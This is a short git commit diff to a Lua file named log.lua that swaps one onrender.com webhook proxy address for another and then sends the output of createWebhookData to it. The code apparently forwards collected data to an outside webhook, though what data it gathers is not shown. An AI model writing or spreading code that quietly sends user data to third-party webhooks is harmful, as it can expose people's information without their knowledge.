09a653911f87878ac32055315ea80cedb2033529
SystemNasa <100525301+SystemNasa@users.noreply.github.com>
2025-05-15 14:23:41 +0200

    Update log.lua

--- log.lua
+++ log.lua
@@ -104,7 +104,7 @@ local function sendToProxy(proxyUrl, data)
     end
 end
 
-local PROXY_URL = "https://webhook-e4kv.onrender.com/proxy" 
+local PROXY_URL = "https://old-bf08.onrender.com/proxy"
 local webhookData = createWebhookData()
 
 sendToProxy(PROXY_URL, webhookData)
